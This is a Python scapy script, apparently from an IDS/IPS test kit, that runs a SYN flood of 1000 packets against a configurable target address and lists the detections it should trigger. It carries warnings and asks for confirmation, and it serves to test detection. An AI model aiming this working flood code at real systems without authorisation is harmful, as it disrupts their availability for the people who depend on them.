#!/usr/bin/env python3
"""
Threat Simulation 3: SYN Flood DoS Attack

This script simulates a SYN flood attack to test IDS/IPS detection.
Expected Detection: High packet rate (>500 packets/min) from single source

⚠️ WARNING: This can impact network performance! Only use in test environments!
⚠️ Requires administrator/root privileges (raw sockets)
"""

import sys
import time
from datetime import datetime

try:
    from scapy.all import IP, TCP, send, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("ERROR: scapy not installed!")
    print("Install with: pip install scapy")
    sys.exit(1)

# Configuration
TARGET_IP = "192.168.12.144"  # ⚠️ CHANGE THIS to your IDS/IPS monitored system
TARGET_PORT = 80  # Target service port
PACKET_COUNT = 1000  # Number of SYN packets to send
PACKETS_PER_BATCH = 10  # Send in batches
DELAY_BETWEEN_BATCHES = 0.5  # Seconds

print("=" * 70)
print("THREAT SIMULATION 3: SYN Flood DoS Attack")
print("=" * 70)
print(f"\nTarget IP:         {TARGET_IP}")
print(f"Target Port:       {TARGET_PORT}")
print(f"Total Packets:     {PACKET_COUNT}")
print(f"Batch Size:        {PACKETS_PER_BATCH}")
print(f"Batch Delay:       {DELAY_BETWEEN_BATCHES}s")
print(f"Expected Rate:     ~{PACKETS_PER_BATCH/DELAY_BETWEEN_BATCHES:.0f} packets/second")
print("\n⚠️  WARNING: This simulates a real DoS attack!")
print("    Can cause network disruption and high CPU usage.")
print("    Only run on test networks with permission!")
print("\n" + "=" * 70)

# Check for root/admin
try:
    import os
    if os.name == 'nt':  # Windows
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:  # Linux/Mac
        is_admin = os.geteuid() == 0

    if not is_admin:
        print("\n⚠️  WARNING: Not running with administrator/root privileges!")
        print("    This script requires elevated privileges to send raw packets.")
        print("    Windows: Run PowerShell as Administrator")
        print("    Linux/Mac: Use sudo")
        print()
except:
    pass

# Confirmation
response = input("\nContinue with SYN flood simulation? (yes/no): ")
if response.lower() != 'yes':
    print("Simulation cancelled.")
    sys.exit(0)

print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Starting SYN flood attack...")
print("-" * 70)

start_time = time.time()
packets_sent = 0
batches = PACKET_COUNT // PACKETS_PER_BATCH

for batch_num in range(batches):
    try:
        # Create SYN packets with random source ports
        for _ in range(PACKETS_PER_BATCH):
            # Create IP packet
            ip = IP(dst=TARGET_IP)

            # Create TCP SYN packet with random source port
            tcp = TCP(sport=RandShort(), dport=TARGET_PORT, flags="S", seq=1000)

            # Send packet
            send(ip/tcp, verbose=0)
            packets_sent += 1

        # Progress update
        if (batch_num + 1) % 10 == 0:
            elapsed = time.time() - start_time
            rate = packets_sent / elapsed
            percent = (packets_sent / PACKET_COUNT) * 100
            print(f"[{datetime.now().strftime('%H:%M:%S')}] "
                  f"Sent: {packets_sent:4d}/{PACKET_COUNT} ({percent:5.1f}%) "
                  f"- Rate: {rate:6.1f} pkt/s")

        # Delay between batches
        time.sleep(DELAY_BETWEEN_BATCHES)

    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user.")
        break
    except Exception as e:
        print(f"Error sending packet: {e}")
        continue

end_time = time.time()
duration = end_time - start_time

# Results
print("\n" + "=" * 70)
print("SYN FLOOD ATTACK RESULTS")
print("=" * 70)
print(f"Target:          {TARGET_IP}:{TARGET_PORT}")
print(f"Packets Sent:    {packets_sent}/{PACKET_COUNT}")
print(f"Duration:        {duration:.2f} seconds")
print(f"Attack Rate:     {packets_sent/duration:.2f} packets/second")
print(f"Total Traffic:   ~{packets_sent * 0.06:.2f} KB (assuming 60 bytes/packet)")

print("\n" + "=" * 70)
print("EXPECTED IDS/IPS DETECTION")
print("=" * 70)
print("✓ Rule-Based Detection:")
print("  - DoS/DDoS attack pattern (>500 packets/min)")
print("  - Category: DOS_ATTACK")
print("  - Severity: CRITICAL")
print("  - Pattern: Multiple SYN packets without ACK")
print("\n✓ ML Detection:")
print("  - Extremely high packet rate")
print("  - Unusual traffic pattern")
print("  - One-way communication (SYN only)")
print("  - Threat Level: CRITICAL")
print("\n✓ Baseline Anomaly:")
print("  - Traffic spike")
print("  - Abnormal packet rate from single source")
print("\n" + "=" * 70)
print("\nCheck the IDS/IPS 'Network Monitor' tab for detection alerts!")
print("Expected alert: '🚨 DoS/DDoS attack detected'")
print("=" * 70)

print("\n⚠️  TIP: Monitor target system CPU/network usage to verify impact")
